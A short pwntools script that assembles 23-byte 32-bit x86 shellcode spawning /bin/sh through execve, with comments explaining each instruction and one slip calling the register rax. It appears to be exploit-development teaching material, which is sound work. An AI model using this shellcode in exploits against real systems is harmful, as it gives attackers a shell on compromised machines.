from pwn import *

# Shellcode for execve("/bin/sh",0,0) 
context.arch = "i386"
shellcode = """
xor eax, eax
push eax
push eax
pop ecx
pop edx
push eax
push 0x68732f2f
push 0x6e69622f
push esp
pop ebx
mov al, 0xb
int 0x80
"""
# line 5 to 9: Zero out eax,ecx and edx.
# line 10: Push some nulls for string termination.
# line 11: Push "//sh".
# line 12: Push "/bin"
# line 13 to 14: Moving the pointer which points to "/bin//sh" into ebx.
# line 15: Moving the syscall number of execve() into rax.

shellcode = asm(shellcode)
log.info(f"bytes of the shellcode: {shellcode}")
log.info(f"lenght of the shellcode: {len(shellcode)}")                  # 23 bytes shellcode
